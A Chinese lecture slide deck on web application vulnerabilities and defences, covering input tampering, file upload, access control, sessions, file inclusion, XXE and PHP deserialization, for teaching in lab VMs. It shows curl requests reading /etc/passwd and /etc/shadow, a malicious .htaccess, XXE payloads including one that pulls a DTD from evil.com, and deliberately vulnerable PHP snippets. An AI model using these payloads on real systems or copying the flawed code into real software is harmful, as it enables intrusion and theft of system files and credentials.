---
title: "网络安全"
author: 黄玮
output: revealjs::revealjs_presentation
---

# 第七章 Web 应用漏洞攻防 {id="web-attack-defense"}

---

## Web 安全模型 {id="web-sec-model"}

![](images/chap0x07/web-sec-model.png)

---

## Web 应用模型 {id="web-app-model"}

|          | 浏览器(Browser)  | Web 服务器(Server)         | 后端服务(Backend)          |
| --       | --               | --                         | --                         |
| 业务     | UI / UE          | CRUD / RESTful             | Search / Cache / DB        |
| 框架     | Vue.js           | Laravel / Struts2          | -                          |
| 语言     | js / html / css  | PHP / Java / Python / Ruby | SQL / DSL                  |
| 运行环境 | Chrome / Firefox | Nginx / php-fpm / Tomcat   | K8S / ES / MySQL / MongoDB |
| 基础设施 | Win / macOS      | Linux                      | Linux                      |

---

## 通信协议

* 浏览器 <--> Web 服务器：HTTP

# 回顾 HTTP {id="review-of-http"}

---

1. 浏览器 --- HTTP 请求消息 ---> 服务器
    * 服务器 --- 请求 ---&gt; 后端服务
    * 服务器 &lt;--- 响应 --- 后端服务
2. 浏览器 &lt;--- HTTP 响应消息 --- 服务器

---

![](images/chap0x07/firefox-in-kali-debug-mode.png)

---

## 必知必会基本概念 {id="http-essentials-1"}

`HTTP-message   = Request | Response     ; HTTP/1.1 messages`

---

## 必知必会基本概念 {id="http-essentials-2"}

* 请求行
    * [`Request-Line   = Method SP Request-URI SP HTTP-Version CRLF`](https://www.ietf.org/rfc/rfc2616.txt)
* 请求头
    * 常见请求头
    * 不同请求头取值的特殊含义
* 请求体
    * 二进制文件上传的编码方式
* （响应）状态行
    * `Status-Line = HTTP-Version SP Status-Code SP Reason-Phrase CRLF`
* 响应头
* 响应体

---

## 必知必会基本概念 {id="http-essentials-3"}

* URL 编码
* SQL
* JSON
* ...

# 漏洞攻防训练环境搭建

---

* PHP Web 漏洞复现环境
* WebGoat 漏洞复现环境

---

## 千叮咛万嘱咐的注意事项

1. ⚠️  不要在宿主机上直接搭建漏洞复现环境       ⚠️
2. ⚠️  请在虚拟机内搭建漏洞复现环境             ⚠️
3. ⚠️  且训练入口严格限定在本机虚拟网络范围内   ⚠️

---

## PHP Web 漏洞复现环境 {id="php-web-sec-lab"}

```bash
# （可选步骤）新版 Kali 已在默认安装时禁用 root 用户
# 允许 root 用户远程 SSH 登录
# root 用户权限执行以下命令
sed -i.bak "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g" /etc/ssh/sshd_config

# 开启 SSH 服务
systemctl start ssh

# 设置 SSH 服务开机自启动
systemctl enable ssh

# 检查当前系统中是否已安装 PHP 命令行解释器
php -v

# 如果输出了 PHP 解释器版本信息，则跳过以下安装步骤
# 直接跳到「启动 PHP 内置开发版 Web 服务器」

# 安装当前发行版支持的最新版 PHP 命令行解释器
apt update && apt install php-cli

# 如果需要安装「旧版本」PHP 解释器，推荐使用 Docker
# https://hub.docker.com/_/php

# 安装完毕后检查当前安装的 PHP 命令行解释器版本
php -v

# 启动 PHP 内置开发版 Web 服务器
# 建议在 tmux 会话中执行该命令
php -S 0.0.0.0:8080

# 使用浏览器访问虚拟机的任意一个可用网卡上的 IP 地址
# 端口号设置为 8080
# 例如 http://127.0.0.1:8080/
```

---

## WebGoat 漏洞攻防训练环境 {id="webgoat-lab-setup"}

访问 [https://github.com/c4pr1c3/ctf-games](https://github.com/c4pr1c3/ctf-games) 获得本课程定制的 Web 漏洞攻防训练环境。

> 或访问国内镜像仓库 [https://gitee.com/c4pr1c3/ctf-games](https://gitee.com/c4pr1c3/ctf-games)

# 输入相关的通用漏洞

---

## 一切罪恶都是源于恶意输入数据

* 不要相信任何来自客户端的提交数据
    * 客户端的任何数据校验都是纸老虎
        * 客户端的数据校验机制防君子不防黑客
* 数据和指令/代码必须严格区分
    * 缓冲区溢出时的机器指令运行在可执行堆栈上
    * SQL 注入时执行任意SQL语句
    * XSS 时执行任何客户端脚本代码（JS/Flash AS）
    * 文件上传时上传服务端脚本代码在服务器端执行任意代码

# 1. 未验证的用户输入-示例 {id="tainted-user-input"}

---

## 缺陷代码示例

```php
<?php
$file = $_GET['file'];
echo file_get_contents($file);
```

---

## 利用方式示例

```bash
curl "http://127.0.0.1:8080/exp-1.php?file=exp-1.php"
curl "http://127.0.0.1:8080/exp-1.php?file=/etc/passwd"
curl "http://127.0.0.1:8080/exp-1.php?file=/etc/shadow"
```

---

## 基本原理

攻击者可以篡改 `HTTP 请求消息` 的任何一个部分

* HTTP 请求行 
* HTTP 请求头 
* HTTP 请求体

---

## 常见的输入篡改攻击

* 强制浏览
* 命令注入
* 跨站点脚本攻击
* 缓冲区溢出攻击
* 格式化字符串攻击
* SQL 注入
* Cookie 毒化
* 隐藏域控制

---

## 输入篡改攻击的成因

* 只在客户端进行输入验证
* 过滤时未进行规范化
* 过滤后引入新漏洞

---

## 典型漏洞利用方法

1. 拦截 HTTP 请求数据
2. 修改数据 
3. 继续发送篡改后数据

---

## 典型漏洞利用工具

* HTTP 协议调试工具 
* BurpSuite
* 浏览器内置的开发者工具

---

## 安全加固方案 {id="prevent-input-weakness-1"}

* 所有的用户输入需要在服务器端进行集中的统一验证
    * HTTP 请求行 
    * HTTP 请求头 
    * HTTP 请求体
* 代码复查
* 不要“滥用”隐藏域
    * 存储在 Session 中或从每次请求中获取参数值

---

## 安全加固方案 {id="prevent-input-weakness-2"}

* 请求参数需要严格的验证其类型
    * 数据类型（string, integer, real, etc…）
    * 最小和最大长度
    * 是否允许 NULL
    * 参数是否是必需的
    * 数字的取值范围
    * 特定模式（正则表达式）
        * 白名单机制

---

## 安全加固方案 {id="prevent-input-weakness-3"}

* 服务器返回给客户端的重要参数、赋值使用 `HMAC` 进行参数签名
    * 千万不要使用 `MD5`、`SHA-XXX` 之类的摘要算法对参数进行摘要计算，也不要使用基于“秘密盐值”的 `MD5`、`SHA-XXX` 之类的摘要算法对参数进行摘要计算
        * [Hash 长度扩展攻击可以用来伪造消息和对应的散列值](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)
    * 对客户端提交的请求校验关键逻辑代码中的参数，一旦 `消息完整性签名` 校验失败，说明客户端尝试篡改请求参数攻击，代码逻辑直接跳过后续业务逻辑代码，给客户端返回统一的错误信息

# 2. 缓冲区溢出漏洞 {id="bof"}

---

* 应用程序的缓冲区中存在过量的输入数据，溢出的数据中包含恶意指令且恶意指令被精确填充到可执行堆/栈（内存）中进而导致恶意代码被执行
* 一般情况下，Web 应用程序不存在缓冲区溢出漏洞

---

* Java Web 应用程序不存在缓冲区溢出风险？
    * OutOfMemoryError
    * CVE-2011-0311
    * CVE-2009-1099

---

* PHP Web应用程序不存在缓冲区溢出风险？
    * CVE-2011-3268 
    * CVE-2008-5557 
    * CVE-2008-2050 
    * CVE-2007-1399 
    * CVE-2007-1381 

---

* 其他语言编写的Web应用程序呢？
    * 后台应用系统
    * 本地代码

---

只要系统中直接或间接存在使用 `C/C++` 编写的代码，那么该系统就难以彻底摆脱「缓冲区溢出等」`内存破坏类` 攻击。
 
---

## 安全加固方案 {id="prevention-to-bof"}

* 避免使用本地代码
* 避免直接调用本地应用程序
* 及时更新应用运行环境
    * Java 虚拟机的安全更新补丁
    * PHP 语言的安全更新补丁
* 限制 Web 应用程序的运行权限
    * 沙盒技术

# 3. 文件上传漏洞 {id="file-upload-vul"}

---

* 允许用户上传文件可能会让黑客
    * 在网页中嵌入恶意代码
        * 网页木马：控制客户端（网站用户）
        * XSS漏洞 / CSRF漏洞 / 构造钓鱼页面…
    * 上传webshell
        * 控制服务器
* 文件上传漏洞原理
* 接下来会通过 PHP 代码实例进行讲解

---

## 推荐训练学习资源

* [upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场](https://github.com/c0ny1/upload-labs)

---

## 文件上传漏洞基本原理之利用方式示例

![](images/chap0x07/file-upload-rce-1.png)

---

## 文件上传漏洞基本原理之缺陷代码片段

```php
// 摘自 upload-labs 的 Pass-02/index.php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { // BUG 检查用户上传文件的「文件类型」是否在白名单上
    $temp_file = $_FILES['upload_file']['tmp_name']; // 获取用户上传文件的临时存储文件路径
    $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; // 获取用户上传文件的原始文件名
    if (move_uploaded_file($temp_file, $img_path)) { // 按照用户指定的文件名存储文件到服务器上指定目录
        $is_upload = true;
    } else {
        $msg = '上传出错！';
    }
} else {
    $msg = '文件类型不正确，请重新上传！';
}
```

---

## 有意思的 NULL 字符截断问题 {id="php-null-trim-vul"}

* 何为NULL字符
    * %00
    * ASCII码为0
* PHP官方在 **2010 年 12 月 9 日** `PHP 5.3.4` 版本正式修复了该漏洞
    * [CVE-2006-7243](http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2006-7243)
    * **用了4 年时间修补一个漏洞！**
    * PHP 5.3.4 之前版本仍然受此漏洞影响
* 不仅仅是 PHP 语言受此漏洞影响！

---

[![asciicast](https://asciinema.org/a/lz7w9iJHZ5qUyV4a1b8Ac9xU3.svg)](https://asciinema.org/a/lz7w9iJHZ5qUyV4a1b8Ac9xU3)

---

```php
# 自行体验 PHP 5.3.0 环境中的 CVE-2006-7243 漏洞利用过程
docker run --rm -it c4pr1c3/dve-php:5.3.0 bash
```

---

## 判断文件类型的安全实践 {id="check-file-type-1"}

* 读取[文件头标识](https://www.garykessler.net/library/file_sigs.html)
    * PNG(8 bytes):89 50 4E 47 0D 0A 1A 0A
    * GIF(6 bytes):47 49 46 38 39 61 (GIF89a)

![](images/chap0x07/file-hdr-demo.png)

---

> 文件头标识指纹匹配足够安全吗？

---

**No!**

---

* 对于 GIF 图片的有效性判定方法
    * 补充使用 `getimagesize()`
    * 限制上传的 `GIF` 图片分辨率尺寸在合理范围内

---

![](images/chap0x07/invalid-gif.png)

---

* 对于其他类型文件
    * 禁用上传目录的脚本执行权限

以 `Apache` 为例，可以使用 `.htaccess`

```
<Directory /upload>
Allowoverride All
</Directory>
<Location /upload>
Options None
	Options +IncludesNoExec -ExecCGI
	RemoveHandler .php .phtml .php3 .php4 .php5
	RemoveType .php .phtml .php3 .php4 .php5
	php_flag engine off
	php_admin_flag engine off
	AddType text/plain .html .htm .shtml .php
</Location>
```

---

## .htaccess 防御文件上传漏洞利用的潜在副作用 {id="exploit-htaccess"}

> 攻击者上传精心构造的 `.htaccess` 来使得「上传目录」下对特定文件类型开启脚本解释执行功能

```
<Directory /upload>
Allowoverride All
</Directory>
<Location /upload>
	Options +IncludesNoExec +ExecCGI
	php_flag engine on
	php_admin_flag engine on
    AddType application/x-httpd-php .php666 # 将 .php666 文件扩展名视为 PHP 代码解释执行
    php_value zend.multibyte 1  # 开启 PHP 引擎的多字节支持
    php_value display_errors 1  # 开启 PHP 代码错误信息完全显示
</Location>
```

---

## 继续文件上传漏洞的防御方法探讨

* 即使
    * 检查是否判断了上传文件类型及后缀
    * 定义上传文件类型白名单
    * 文件上传目录禁止脚本解析
* 仍然推荐
    * 定义文件名白名单
    * 上传后文件统一重命名
    * 杜绝 XSS 漏洞 / 文件包含漏洞 / 字符编码漏洞 …

# 服务端脚本相关漏洞

---

* 脆弱的访问控制
* 认证和会话管理缺陷
* 文件包含
* XXE 注入
* 反序列化漏洞
* 第三方组件缺陷

# 4. 脆弱的访问控制 {id="weak-acl"}

---

## 示例

* 文档/软件的下载链接地址保护
    * http://victim.org/docs/1.doc
    * http://victim.org/docs/download.do?id=1
* Web应用程序的后台管理入口地址
    * http://victim.org/admin
    * http://victim.org/console/login
* 后台操作未执行用户身份认证
    * http://victim.org/users/deleteUser.do?userid=001
    * http://victim.org/users/addUser.do?userid=001

---

## 描述

* 内容或程序功能未能有效的保护以限制只允许合法用户的访问
* 典型案例
    * **可预测** 的服务器端对象访问唯一标识
    * 强制浏览（直接在浏览器的地址栏中输入 URL ）
    * 目录遍历
    * 文件访问权限
    * 客户端缓存

---

## 可能的漏洞成因

* 认证只发生在用户登录时
* 仅对 URL 进行鉴权，而不是对完整的请求内容进行鉴权
* 未采取集中式的授权管理，而是分散授权管理

---

## 安全加固方案 {id="harden-access-control-1"}

* 对每个需要保护的请求进行检查，不仅是在用户第一次登录请求时进行检查
* 避免使用自己开发的访问控制，而是使用开发框架内置的或第三方可靠安全访问控制框架
    * 采用声明式而非硬编码的访问控制
    * 集中化访问控制而非分散访问控制

---

## 安全加固方案 {id="harden-access-control-2"}

* 防止客户端缓存重要内容：设置 HTTP 响应头和 `HTML meta` 标签
* 在服务器端使用操作系统提供的访问控制保护文件的未经授权的访问
* 业务模型的访问控制授权建模
    * 访问控制权限划分的三角形基本法则
* 平行权限访问
    * 属主权限检查
* 提升权限访问
    * 使用 ACL

---

### 访问控制的权限三角形模型

![](images/chap0x07/privilege-triangle-model.png)

---

## 安全加固方案 {id="harden-access-control-3"}

| 主键 (id) | 主体 (subject) | 客体 (object)         |
| ---       | -------        | ------                |
| 1         | Alice          | /srv/www/upload/1.doc |
| 2         | Bob            | /srv/www/upload/2.doc |

当发生文件访问请求时，可以通过如下的 SQL 语句来检查当前访问是否是授权操作。

```sql
-- 只有当查询结果 > 0 时才说明是授权访问，否则均是非授权访问行为
select count(id) from tb_acl where subject=%user_name% and object=%access_file_path%
```

# 5. 认证和会话管理缺陷 {id="auth-session-weakness"}

---

## 示例 {id="auth-session-weakness-1"}

* 未采用Session cookie，而是在URL中编码已通过认证的用户名和密码

> https://host/admin/list.jsp?password=0c6ccf51b817885e&username=11335984ea80882d

上面的这个 URL 很容易被一次 `XSS 攻击` 截获到

---

## 常见会话管理类缺陷分类

* 会话预测（Session Prediction）
* 会话劫持（Session Hijacking）
* 会话固定（Session Fixation）
* 会话偷渡（Session Riding）

---

会话预测（Session Prediction）指的是攻击者可以「预测」出服务端的合法「会话令牌」，从而达成身份冒用的效果。

---

* 会话劫持（Session Hijacking）可以通过中间人劫持攻击或跨站点脚本攻击方式拿到用于会话唯一标识的「会话令牌」
* 本节所举的第一个极端简单的脆弱身份认证例子正是这种类型缺陷

---

* 会话固定（Session Fixation）利用到了服务端脚本对于 **身份认证前使用的「会话令牌」在身份认证通过之后没有更换新「会话令牌」** 这个设计模式的缺陷
    * 攻击者诱骗受害用户使用攻击者提供的「会话令牌」完成身份认证，这样，攻击者手里掌握的这个「会话令牌」也就相应的同步变为「身份认证通过会话令牌」了
    * 攻击者相当于在并不需要掌握受害用户身份认证凭据的情况下，「克隆」了受害用户的已登录会话
* 与会话劫持相比，攻击者并不依赖于直接读取到一个已经通过身份认证的「会话令牌」，攻击者初始提供给受害用户的「会话令牌」就是未通过身份认证状态下的
* 攻击得手之后，会话固定和会话劫持的效果是一致的：攻击者拿到了受害者用户身份对应的有效会话令牌

---

* 会话偷渡（Session Riding）是 `跨站点请求伪造（CSRF）` 的另一种表述
* 攻击者不需要克隆受害用户的会话，攻击者一次会话偷渡攻击只是借用受害用户保存在客户端的「会话令牌」执行一次受害用户不知情情况下的认证会话操作，攻击者对于受害用户使用的「会话令牌」具体是什么并不知情

# 6. 文件包含 {id="file-inclusion-vul"}

---

## 漏洞成因 {id="file-inc-causes"}

* **插件** 功能需要「动态加载执行代码」
* 当攻击者可以控制「加载什么代码」的时候，就触发了 `文件包含` 漏洞
* 几乎所有脚本语言都会提供文件包含功能，但 PHP 语言由于其过于灵活和自由的代码执行机制导致了大多数文件包含类漏洞都是出现在 PHP 编写的网站程序之中

---

## PHP 文件包含漏洞 {id="php-file-inc"}

* include()
* require()
* include_once()
* require_once()

> 上述四个 PHP 函数都可以传入「变量」来动态加载 PHP 源代码文件

> 既可以是「本地文件」，也可以是「远程文件」

---

## 一段缺陷代码示例

```php
<?php
if (@$_GET['page']) {
    include($_GET['page']);
} else {
    include "show.php";
}
```

---

> PHP 7.2.6 的默认运行时配置（php.ini）是禁止包含远程文件的，如下图所示是一次失败的远程文件包含漏洞利用行为尝试

![](images/chap0x07/php-include-remote-0.png)

---

> 如下图所示则是修改了 php.ini，设置 `allow_url_include=On` 之后再次执行得到的成功效果截图

![](images/chap0x07/php-include-remote-1.png)


---

上述例子中被包含的远程文件 `remote.php` 代码如下：

```php
<?php
phpinfo();
```

---

需要注意的是，除了 `allow_url_include=On` 远程文件包含漏洞利用的依赖配置之外，还依赖于 `allow_url_fopen=On`

---

## PHP 本地文件包含读取文件 {id="php-file-inc-read-file"}

![](images/chap0x07/php-include-local-1.png)

---

## PHP 本地文件包含执行代码 {id="php-file-inc-lce"}

* 不依赖于修改 PHP 的默认运行时配置即可完成任意 PHP 代码执行
* 但相比较于远程文件包含方式，本地文件包含漏洞的利用往往需要配合 `文件上传` 漏洞利用才能达成目的
* 攻击者需要先上传包含 PHP 代码的文件到服务器上，然后还需要知道已上传文件存储在服务器上的路径（绝对路径或相对当前脚本执行环境的相对路径）
* 进而通过控制文件包含参数的赋值来加载刚刚上传的恶意文件中的 PHP 代码

---

## PHP 文件包含漏洞的利用技巧 {id="php-file-inc-tips-1"}

* 利用 `php://input`
	* [php://input](http://php.net/manual/zh/wrappers.php.php#wrappers.php.input) 是个可以访问请求的原始数据的 **只读流** 
	* 在使用 POST 方式请求时，HTTP 请求体中的数据会赋值给 HTTP 请求头中对应 GET 变量值为 `php://input` 的变量

---

> 如下图所示，使用 curl 构造了一个这样的请求，其中 HTTP 请求体中对应的是一段 PHP 代码：在当前脚本目录下执行操作系统 ls 命令

![](images/chap0x07/php-include-php-input-0.png)

---

注意这种漏洞利用方式，同样依赖于 PHP 的运行时配置 `allow_url_include=On` ，否则漏洞利用会失败，如下图所示

![](images/chap0x07/php-include-php-input-1.png)

---

* 利用 [data://](http://php.net/manual/zh/wrappers.data.php)

![](images/chap0x07/php-include-data-1.png)

* [php://filter](http://php.net/manual/zh/wrappers.php.php#wrappers.php.filter) 
* `PHP %00` 截断漏洞

---

## 防御 PHP 文件包含漏洞 {id="prevention-to-php-file-inc"}

* 修改 PHP 的运行时配置文件 `php.ini`
	* 开启 `open_basedir` 函数，将其设置为指定目录，则只有该目录的文件允许被访问
	* `allow_url_include=Off`  禁止远程文件包含
	* 从代码级别避免和修复文件包含漏洞
		* 过滤文件包含路径变量的输入，采用白名单方式包含文件
		* 建议禁止从程序外部输入读取包含文件的路径

# 7. XXE 注入 {id="xxe"}

---

**X**ML E**x**ternal **E**ntity（XML 外部实体）注入。

---

[![php xxe demo](https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH.svg)](https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH)

---

## XML 基础 {id="xml-basics"}

```xml
<!--1. XML 声明-->
<?xml version="1.0"?>
<!--2. 文档类型定义 Document Type Definition, DTD （可选）-->
<!DOCTYPE email [  <!--定义一个名为 email 类型的文档（内部 DTD）-->
<!ELEMENT email (to,from,title,body)>  <!--定义 email 元素有四个子元素-->
<!ELEMENT to (#PCDATA)>      <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>    <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT title (#PCDATA)>   <!--定义title元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>    <!--定义body元素为”#PCDATA”类型-->
]>
<!--3. 文档元素-->
<email>
<to>Bob</to>
<from>Alice</from>
<title>Cryptograpphy</title>
<body>We are famous guys.</body>
</email>
```

---

* `内部 DTD` - `<!DOCTYPE 根元素 [元素声明]>`
* `外部 DTD` 
    * `<!DOCTYPE 根元素 SYSTEM "文件名">`
---

## 可以用于 XXE 攻击的 XML 文档举例 {id="xxe-examples"}

```xml
<!-- 利用外部 DTD，读取系统文件 /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<a>
        <!-- 读取到的 /etc/passwd 文件内容被保存在 passwd 变量中 -->
        <value>&passwd;</value>
</a>
```

```xml
<!-- 参数实体定义 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE aaa [
    <!ENTITY %f SYSTEM "http://evil.com/evil.dtd">
    %f;
]>
<aaa>&b;</aaa>

<!-- 其中 evil.dtd 文件内容如下 -->
<!ENTITY b SYSTEM "file:///etc/passwd">
```

---

上述 2 个例子中的 `XML 实体` 引用语法略有不同，但都是使用 `ENTITY` 关键字声明，可以当做「变量」来理解。

* `&`
* `%`

---

## XXE 漏洞成因关键 {id="xxe-internals"}

* `XML` 代码中包含了 **加载外部资源** 的「恶意变量声明」
* 服务端代码在解析 `XML` 代码时 **无限制** 解析「恶意变量」声明语句
* 「恶意变量」的值被 **回显** 

---

## XXE 漏洞利用典型效果 {id="xxe-impacts"}

* 敏感数据泄露（任意文件读取）
* 拒绝服务攻击
* 服务器端请求伪造
* 远程代码执行
* 执行应用程序托管服务器的网络端口扫描

---

## 防御 XXE 攻击 {id="prevention-to-xxe"}

* 禁用 XML 外部实体和 DTD 处理
* 使用无已知漏洞的 XML 解析器引擎组件

---

## 推荐训练学习资源 {id="xxe-recommends"}

* [PHP XXE 漏洞与利用源代码分析示例](https://github.com/vulnspy/phpaudit-XXE)
* [vulhub 提供的 XXE 漏洞学习训练环境](https://github.com/vulhub/vulhub/tree/master/php/php_xxe)

---

> 只有 PHP 语言存在 XXE 漏洞吗？

---

## 探索一下其他编程语言

* [python 官方文档中对 xml 处理的常见漏洞总结](https://docs.python.org/3/library/xml.html#xml-vulnerabilities)
* [python_docx 存在 XXE 漏洞预警 CVE-2016-5851](https://snyk.io/vuln/SNYK-PYTHON-PYTHONDOCX-40402)
* [OWASP 的 XXE Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

[![python xxe demo](https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ.svg)](https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ)

---

## [Python XML 解析器其他漏洞类型](https://docs.python.org/3/library/xml.html#xml-vulnerabilities) {id="python-xml-parser-vuls"}

| kind                      | sax          | etree        | minidom      | pulldom      | xmlrpc       |
| --                        | --           | --           | --           | --           | --           |
| billion laughs            | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** |
| quadratic blowup          | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** |
| external entity expansion | 安全 (4)     | 安全 (1)     | 安全 (2)     | 安全 (4)     | 安全 (3)     |
| DTD retrieval             | 安全 (4)     | 安全         | 安全         | 安全 (4)     | 安全         |
| decompression bomb        | 安全         | 安全         | 安全         | 安全         | **易受攻击** |

1. xml.etree.ElementTree 不会扩展外部实体并在实体发生时引发 ParserError。
2. xml.dom.minidom 不会扩展外部实体，只是简单地返回未扩展的实体。
3. xmlrpclib 不扩展外部实体并省略它们。
4. 从 Python 3.7.1 开始， **默认情况** 下不再处理外部通用实体。

---

## 推荐训练学习资源 {id="xxe-recommends-others"}

* [python-xxe](https://github.com/c4pr1c3/python-xxe)
* [一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)


# 8. 反序列化漏洞 {id="deserialization"}

---

## 基础知识 {id="serialization-basics"}

* 序列化是将 **应用程序对象** 状态转换为 **二进制数据或文本数据** 的过程
* 反序列化则是其逆向过程，即从 **二进制数据或文本数据** 创建对象状态

> 应用程序使用该功能来支持有效 **共享或存储** `对象状态`

---

## 反序列化的典型应用场景 {id="serialization-usage"}

和前文的「文件包含」漏洞存在“合理性”类似： `反序列化` 特性也有典型需求场景

* 分布式系统的「远程过程调用」 **传参**：通过网络传输「对象」
* 游戏的进度 **存档** （序列化）与 **读档** （反序列化）

---

⚠️  但和「文件包含」功能一样，很快 **上述 `反序列化` 过程也遭到攻击者的恶意利用** ⚠️

---

## 「特性」被滥用或误用导致的『漏洞』

* 文件上传
* XXE
* 文件包含
* 反序列化

---

* 攻击者通过 **创建恶意的反序列化对象** ，在应用程序执行序列化时远程执行代码和篡改数据
* 使用不可信来源的对象序列化的分布式应用程序和 API 特别容易受到反序列化攻击

---

⚠️ **流行的服务端编程语言 PHP、Java 和 Python 等均有可能编写出包含反序列化漏洞的代码** ⚠️

---

## 反序列化漏洞典型案例

* [2015 年 Apache Commons Collections 反序列化远程命令执行漏洞](https://commons.apache.org/proper/commons-collections/security-reports.html) 影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMS 等
* [2017 年 3 月 15 日，fastjson 官方发布安全公告](https://github.com/alibaba/fastjson/wiki/security_update_20170315) 表示：fastjson 在 1.2.24 及之前版本存在（反序列化）远程代码执行高危安全漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器
    * fastjson 是 Java 社区常用的 JSON 和 Java Bean 转换（反序列化）组件
* [Python 编写的 SQL 注入自动化利用神器 Sqlmap 存在的 Pickle 反序列化漏洞导致代码执行报告](https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/)

---

⚠️  前方高能，开始「烧脑🤯」⚠️

---

## PHP 对象序列化基本概念 {id="php-serialization-official"}

[PHP 官方文档中摘录如下](https://www.php.net/manual/zh/language.oop5.serialization.php)

> 所有php里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是 **不会保存对象的方法**，只会保存类的名字。

---

## PHP 反序列化漏洞原理基础 {id="php-unserialize-basics"}

```php
<?php
// PHP 的对象序列化过程
class User {

    private $mobile;
    protected $age;
    public $name;


    public function say() {
        echo "My name is $this->name\n";
    }

    public function __construct($age = NULL, $name = NULL, $mobile = NULL) {
        echo "__construct is called\n";
        $this->age = $age;
        $this->name = $name;
        $this->mobile = $mobile;
    }

    public function __toString() {
        return "$this->name is $this->age old\n";
    }

    public function __sleep() {
        echo "__sleep is called\n";
        return array('age', 'name', 'mobile');
    }

    public function __wakeup() {
        echo "__wakeup is called\n";
    }

    public function __destruct() {
        echo "__destruct is called on $this->name \n";
    }
}

$user = new User(22, "Zhang San", "13800138000"); // 对象创建时自动触发 __construct()
echo $user; // $user 对象被当做「字符串」访问，自动触发 __toString()

// 序列化
$s_user = serialize($user); // 序列化时自动触发 __sleep() 方法
file_put_contents("/tmp/ser.bin", $s_user); // 序列化结果写入文件方便查看输出结果里的「不可打印」字符
echo $s_user . "\n"; // 打印序列化结果
system("hexdump -C /tmp/ser.bin"); // 16 进制方式查看「序列化结果」

// 反序列化
$r_user = unserialize(file_get_contents("/tmp/ser.bin")); // 反序列化时触发 __wakeup() 方法
$r_user->name = "Li Si";
echo $r_user; // 被 echo 时触发「字符串」转换魔术方法 __toString
$r_user->say(); // 调用「恢复出来的对象」的方法

// 序列化过程结束
printf("EOF reached\n");

// 全部脚本执行完毕，自动触发 $user 对象的 __destruct()
// 注意对象销毁的顺序和对象的创建顺序是相反的
// 栈操作顺序：先创建，后销毁

// 执行结果如下
/*
__construct is called
Zhang San is 22 old
__sleep is called
O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}
00000000  4f 3a 34 3a 22 55 73 65  72 22 3a 33 3a 7b 73 3a  |O:4:"User":3:{s:|
00000010  36 3a 22 00 2a 00 61 67  65 22 3b 69 3a 32 32 3b  |6:".*.age";i:22;|
00000020  73 3a 34 3a 22 6e 61 6d  65 22 3b 73 3a 39 3a 22  |s:4:"name";s:9:"|
00000030  5a 68 61 6e 67 20 53 61  6e 22 3b 73 3a 31 32 3a  |Zhang San";s:12:|
00000040  22 00 55 73 65 72 00 6d  6f 62 69 6c 65 22 3b 73  |".User.mobile";s|
00000050  3a 31 31 3a 22 31 33 38  30 30 31 33 38 30 30 30  |:11:"13800138000|
00000060  22 3b 7d                                          |";}|
00000063
__wakeup is called
Li Si is 22 old
My name is Li Si
EOF reached
__destruct is called on Li Si
__destruct is called on Zhang San
*/
```

---

看上去 `User` 对象经过「序列化」（调用 `serialize()` 函数）之后变成了以下「字符串」：

```
O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}
```

---

### 不要被不可打印字符欺骗了

* `protected` 属性字段 `age` 左边的 `*` (2a) 字符的左右两边被不可打印字符 `\00` 包围
* `private` 属性字段 `mobile` 左边拼接了字符串 `\00User\00` 其中 `User` 是类名

---

经过一番简单的上下文字符串特征比对分析，我们可以总结出如下简单「序列化」规律：

* `<对象标识>:<类名长度>:"类名":类的成员变量个数:{`
    * `O:4:"User":3:{`
* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值>;`
    * `s:6:"\00*\00age";i:22;`
* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;`
    * `s:4:"name";s:9:"Zhang San";`
* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;}`
    * `s:12:"\00User\00mobile";s:11:""13800138000";}`

---

至此，我们可以再来回味一下 [PHP 官方文档中摘录如下这句话](https://www.php.net/manual/zh/language.oop5.serialization.php) 的关键词为什么用的是 **字节流** ：

> 所有php里面的值都可以使用函数 serialize() 来返回一个包含 **字节流** 的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。

---

基础知识普及完毕，现在终于可以看一下课本里的 PHP 反序列化漏洞原理代码了。

---

## 漏洞代码

```php
<?php
class cuc {
    var $test = 'whatever';
    function __wakeup() {
        $fp = fopen("shell.php", "w");
        fwrite($fp, $this->test);
        fclose($fp);
        echo '__wakeup';
    }
}

$class = $_GET['test'];

unserialize($class);
```

---

